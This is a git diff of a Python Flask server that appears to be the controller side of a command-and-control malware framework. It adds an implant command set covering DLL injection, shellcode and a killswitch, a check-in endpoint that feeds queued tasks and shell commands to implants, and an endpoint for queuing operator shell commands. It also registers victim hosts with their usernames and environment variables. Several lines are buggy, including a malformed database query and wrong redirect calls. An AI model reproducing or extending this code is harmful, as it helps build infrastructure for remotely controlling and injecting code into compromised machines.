@@ -11,6 +11,8 @@ import requests
 from app.app import createFlaskApp
 import uuid
 from werkzeug.utils import secure_filename
+from app.models.base import db
+import flask_sqlalchemy
 
 
 """控制端表"""
@@ -20,10 +22,21 @@ lock = mp.Lock()
 implant_lock = mp.Lock()
 TASKS = []
 AGENTS = []
+SHELL = []
 
 createflask = createFlaskApp()
 app = createflask.create_app()
 encryptionkey = None
+
+
+"""  
+implant commands    
+0 = sleep
+1 = dllinjection
+2 = shellcode
+3 = killswitch
+"""
+
 
 
 @app.route("/upload/<filename>", methods = ["POST"])
@@ -49,19 +62,30 @@ def upload_files(filename):
         
 @app.route('/downloads/<filename>', methods = ["GET"])
 def download_file(filename):
+    #update last_seen in database
     return request.send_from_directory(app.config["UPLOAD_FOLDER"], filename)
 
 
-@app.route("/tasks", methods=["GET"])
-def download_tasks():
-    global TASKS
-    lock.acquire()
-    try:
-        batch = "\n".join(TASKS[:5])
-        TASKS = TASKS[5:]
-    finally:
-        lock.release()
-    return batch 
+@app.route("/checkin", methods=["POST", "GET"])
+def check_in():
+    global TASKS, SHELL
+    if request.method == "POST":
+        whoami = request.get_json()
+        if flask_sqlalchemy.session.query(db).filter(whoami).count() != 0:
+            #update last_seen in database
+            lock.acquire()
+            try:
+                task = "\n".join(TASKS[:1])
+                TASKS = TASKS[1:]
+                shell_command = ''
+                if task == 2:
+                    shell_command = shell_command.join(SHELL[:1])
+                    SHELL = SHELL[1:]
+            finally:
+                lock.release()
+            return task, shell_command
+        else:
+            return Flask.redirect(Flask.url_for('addAgent'))
 
 @app.route("/response", methods=["POST"])
 def print_response():
@@ -95,6 +119,7 @@ def addAgent():
         username = fromimplant['username']
         environment_variables = fromimplant["enviroment_variables"]
         implant_ip = request.environ['REMOTE_ADDR']
+        #update last_seen in database
         print(fromimplant, implant_ip, implant_id)
         encryption_key = encryptionkey()
         #agent = agents(implant_id, guid, hostname, username, implant_ip, encryptionkey)
@@ -102,7 +127,19 @@ def addAgent():
         return jsonify(encryption_key)
     else:
         return jsonify("you're not authorized >:(")
-
+    
+@app.route("/shell", methods=["POST"])
+def get_shell_commands():
+    command = request.get_json()
+    lock.acquire()
+    try:
+        shellcommand = command["shellcommand"]
+        SHELL.append(shellcommand)
+    finally:
+        lock.release()
+    print("accepted shell_code")
+    return "Success"
+    
 def encryptionkey():
     #if encryptionkey == None:
     #    encryptionkey = getencryptionkey()
